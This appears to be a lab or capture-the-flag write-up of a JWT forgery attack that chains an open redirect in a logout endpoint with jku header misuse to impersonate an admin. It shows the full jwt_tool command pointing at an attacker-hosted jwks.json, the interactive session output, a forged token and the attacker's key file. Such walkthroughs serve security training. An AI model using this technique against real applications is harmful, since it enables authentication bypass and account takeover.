- __Vulnerability__: Open Redirection and jku Claim Misuse
- __Goal__: Abuse the jku claim to gain administrator access to the application
- __Description__: After reviewing the application's source code, we observe that the application has a validation that the jwks.json should come only by the localhost, how ever after further review of the source code we can observe that the logout functionality is vulnerable to open redirection, thus, we can bypass the jwks.json restriction and abuse the jku functionality.
## jwt tool 

```sh
python3 jwt_tool.py <orinigal_jwt> -X s -ju http://127.0.0.1:1337/logout?returnTo=http://attacker.local/jwks.json -T

Token header values:
[1] alg = "RS256"
[2] typ = "JWT"
[3] kid = "9551d267-8e8e-4a9e-b1cb-113deba6cf34"
[4] jku = "http://127.0.0.1:1337/.well-known/jwks.json"
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 3

Current value of kid is: 9551d267-8e8e-4a9e-b1cb-113deba6cf34
Please enter new value and hit ENTER
> jwt_tool
[1] alg = "RS256"
[2] typ = "JWT"
[3] kid = "jwt_tool"
[4] jku = "http://127.0.0.1:1337/.well-known/jwks.json"
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:                                                                                              
[1] user = JSON object:
    [+] username = "admin2"
    [+] is_admin = 0
[2] iat = 1718972545    ==> TIMESTAMP = 2024-06-21 08:22:25 (UTC)
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[5] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:                                                                                      
(or 0 to Continue)                                                                                                 
> 1

Please select a sub-field number for the user claim:                                                               
(or 0 to Continue)                                                                                                 
[1] username = admin2
[2] is_admin = 0
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step
> 1

Current value of username is: admin2                                                                               
Please enter new value and hit ENTER
> admin

[1] username = admin
[2] is_admin = 0
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step
> 0
[1] user = JSON object:
    [+] username = "admin"
    [+] is_admin = 0
[2] iat = 1718972545    ==> TIMESTAMP = 2024-06-21 08:22:25 (UTC)
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[5] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:                                                                                      
(or 0 to Continue)                                                                                                 
> 0
Paste this JWKS into a file at the following location before submitting token request: http://127.0.0.1:1337/logout?returnTo=http://0.tcp.eu.ngrok.io:19067/jwks.json                                                                 
(JWKS file used: /home/kali/.jwt_tool/jwttool_custom_jwks.json)                                                    
/home/kali/.jwt_tool/jwttool_custom_jwks.json                                                                      
jwttool_fa2803d6e8b0b92701a6afb967893f2d - Signed with JWKS at http://127.0.0.1:1337/logout?returnTo=http://0.tcp.eu.ngrok.io:19067/jwks.json                                                                                         
[+] eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Imp3dF90b29sIiwiamt1IjoiaHR0cDovLzEyNy4wLjAuMToxMzM3L2xvZ291dD9yZXR1cm5Ubz1odHRwOi8vMC50Y3AuZXUubmdyb2suaW86MTkwNjcvandrcy5qc29uIn0.eyJ1c2VyIjp7InVzZXJuYW1lIjoiYWRtaW4iLCJpc19hZG1pbiI6MH0sImlhdCI6MTcxODk3MjU0NX0.o6UXO7ldJgZJpkJKcsPcrFDzHzSBgsfQmcx6OJns2Ax1WcOhBv8hRd5YPBKbxcNY4PikpR2wvpa9rVX2g4Jkjpzzv7hgT9YN_eAVL84aFxkink6eqcEV4daw__oOBYOlATNd4oLmOD-lI0GdjvVA4Cqwcmo48WoTVWmwyvHcDkKUtllHhYMLMuQFmVfoPzHLiKb71yGZ3kPz-U0rgTQo7-n4HOncjmkfRl5d18maQkZ2hUUVu6H4OBAr9qh0C9INVD99rcjTE9SVWbSL4E4GtQy-rcwWgKB3DHvX3dtVFQbp49ajZ6SWJbwY-CXRe8LRcI9tcAU6JvmZ9vC_HK-uLg                                                                                        
                                                                                                                   
┌──(kali㉿kali)-[~/jwt_tool]
└─$ cat /home/kali/.jwt_tool/jwttool_custom_jwks.json
{
    "keys":[
        {
            "kty":"RSA",
            "kid":"jwt_tool",
            "use":"sig",
            "e":"AQAB",
            "n":"25owNGKe-SLKMVrZwNUHJCSz-ab5_ckAtNT4mdm400qH3jueSdHPxFrirLjbRmWYL5S1NVIevkRO-gdTpj9a6wKHgm95hCSPmqJ4oUT59QjQUbkqAFD_k_wUUEwbHnSblgHtkF5z55GtbKGgW44l1Tb22fhhUHCcIqQVVQRnSkH17RIFas4KndspArCxbxqpTpeI7UU4pQTj6IYQfqNH-oORcaSecK4uUlf2Iu935EbvvVWoQhv8kOFNvt8n02V8guCSK8o4Z3smSOl25xLpOHfC0nRy2lWiHzpPsyTpaQbdJHuIHAeYft6FUX_4mqPa2vw0ezccrKxnluiWIuYgLw"
        }
    ]
}
```

- The final step is to host the produced jwks.json on our attacker.local server and then replace the previously generated JWT token by submitting an HTTP request.

